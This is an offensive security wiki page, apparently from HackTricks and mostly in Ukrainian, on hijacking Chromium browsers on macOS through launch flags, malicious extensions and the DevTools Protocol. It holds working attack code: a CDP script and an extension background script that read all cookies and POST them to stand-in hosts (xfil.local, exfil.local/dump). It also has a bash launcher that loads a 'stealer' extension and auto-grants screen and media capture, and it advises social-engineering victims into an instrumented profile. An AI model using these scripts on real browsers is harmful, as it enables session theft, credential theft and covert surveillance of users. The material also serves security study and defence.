# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Браузери на базі Chromium, такі як Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi і Opera, використовують однакові параметри командного рядка, файли налаштувань і інтерфейси автоматизації DevTools. На macOS будь-який користувач із доступом до GUI може завершити поточну сесію браузера й повторно відкрити її з довільними прапорами, розширеннями або DevTools endpoints, які працюють з привілеями цільового користувача.

#### Запуск Chromium з кастомними прапорами на macOS

macOS зберігає один UI-екземпляр на профіль Chromium, тож інструментування зазвичай вимагає примусового закриття браузера (наприклад за допомогою `osascript -e 'tell application "Google Chrome" to quit'`). Зловмисники зазвичай перезапускають його через `open -na "Google Chrome" --args <flags>`, щоб інжектувати аргументи без модифікації app bundle. Обгортання цієї команди всередині user LaunchAgent (`~/Library/LaunchAgents/*.plist`) або login hook гарантує, що модифікований браузер буде відновлений після перезавантаження/виходу з сеансу.

#### `--load-extension` Flag

Прапор `--load-extension` автоматично завантажує unpacked extensions (шляхи через коми). Поєднайте його з `--disable-extensions-except`, щоб заблокувати легітимні розширення та змусити працювати лише ваш payload. Зловмисні extensions можуть запитувати високопривілейовані дозволи, такі як `debugger`, `webRequest` і `cookies`, щоб перейти до DevTools протоколів, підмінити CSP заголовки, понизити HTTPS або відфільтрувати сесійні дані відразу після старту браузера.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Ці прапори відкривають Chrome DevTools Protocol (CDP) через TCP або pipe, щоб зовнішні інструменти могли керувати браузером. Google зафіксував широке зловживання цього інтерфейсу інфостілерами, і, починаючи з Chrome 136 (березень 2025), ці прапори ігноруються для профілю за замовчуванням, якщо браузер не запущено з нестандартним `--user-data-dir`. Це примушує App-Bound Encryption для реальних профілів, але зловмисники все ще можуть створити новий профіль, змусити жертву аутентифікуватися в ньому (phishing/triage assistance) і збирати Cookies, токени, стани довіри пристрою або WebAuthn реєстрації через CDP.

#### `--user-data-dir` Flag

Цей прапор перенаправляє весь профіль браузера (History, Cookies, Login Data, Preference files тощо) у шлях під контролем зловмисника. Він є обов’язковим при поєднанні сучасних збірок Chrome з `--remote-debugging-port`, а також ізолює змінений профіль, щоб можна було підкинути попередньо заповнені `Preferences` або `Secure Preferences` файли, які вимикають підказки безпеки, автоінсталюють розширення та змінюють схеми за замовчуванням.

#### `--use-fake-ui-for-media-stream` Flag

Цей прапор обходить запит на дозвіл для камери/мікрофона, тому будь-яка сторінка, що викликає `getUserMedia`, одразу отримує доступ. Поєднуйте його з прапорами типу `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` або з командами CDP `Browser.grantPermissions`, щоб тихо захоплювати аудіо/відео, демонструвати екран або обійти перевірки дозволів WebRTC без взаємодії користувача.

## Remote Debugging & DevTools Protocol Abuse

Після перезапуску Chrome з виділеним `--user-data-dir` і `--remote-debugging-port` ви можете підключитися через CDP (наприклад за допомогою `chrome-remote-interface`, `puppeteer` або `playwright`) і автоматизувати робочі процеси з високими привілеями:

- **Cookie/session theft:** `Network.getAllCookies` та `Storage.getCookies` повертають HttpOnly значення навіть коли App-Bound Encryption зазвичай блокує доступ до файлової системи, бо CDP просить запущений браузер їх розшифрувати.
- **Permission tampering:** `Browser.grantPermissions` та `Emulation.setGeolocationOverride` дозволяють обійти запити на доступ до камери/мікрофона (особливо у поєднанні з `--use-fake-ui-for-media-stream`) або фальсифікувати перевірки безпеки на основі геолокації.
- **Keystroke/script injection:** `Runtime.evaluate` виконує довільний JavaScript у активній вкладці, що дозволяє виводити креденшіали, змінювати DOM або інжектувати бекони персистенції, які виживають під час навігації.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` та `Fetch.enable` перехоплюють аутентифіковані запити/відповіді в реальному часі без створення артефактів на диску.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Оскільки Chrome 136 блокує CDP для профілю за замовчуванням, копіювання/вставлення наявного у жертви каталогу `~/Library/Application Support/Google/Chrome` у тимчасовий шлях більше не дає розшифрованих cookies. Натомість social-engineer користувача, щоб він автентифікувався в instrumented profile (наприклад, "helpful" support session), або перехоплюйте MFA tokens в транзиті через CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (розширення залишаються в своєму контексті) і дає змогу:

- Тихе викрадення cookies та credentials за допомогою `Network.getAllCookies`/`Fetch.getResponseBody`.
- Зміна дозволів сайту (camera, microphone, geolocation) та обхід security interstitial, що дозволяє phishing-сторінкам видавати себе за діалоги Chrome.
- Підміна на шляху TLS-попереджень, завантажень або WebAuthn-підказок шляхом програмного керування `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` або `Security.handleCertificateError`.

Завантажте розширення з `--load-extension`/`--disable-extensions-except`, щоб не потрібна була взаємодія користувача. Мінімальний background script, який використовує API, виглядає так:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Розширення також може підписатися на події `Debugger.paused`, щоб читати змінні JavaScript, патчити inline scripts або ставити користувацькі breakpoints, які зберігаються під час навігації. Оскільки все виконується в GUI-сесії користувача, Gatekeeper і TCC не спрацьовують, тому ця техніка підходить для malware, яке вже отримало виконання в контексті користувача.

### Tools

- https://github.com/breakpointHQ/snoop - Автоматизує запуск Chromium з payload extensions і надає інтерактивні CDP hooks.
- https://github.com/breakpointHQ/VOODOO - Схожий набір інструментів, орієнтований на перехоплення трафіку та інструментування браузера для операторів macOS.
- https://github.com/cyrus-and/chrome-remote-interface - Бібліотека Node.js для скриптингу Chrome DevTools Protocol дампів (cookies, DOM, permissions) після запуску екземпляра з `--remote-debugging-port`.

### Приклад
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Знайдіть більше прикладів у посиланнях на інструменти.

## Посилання

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
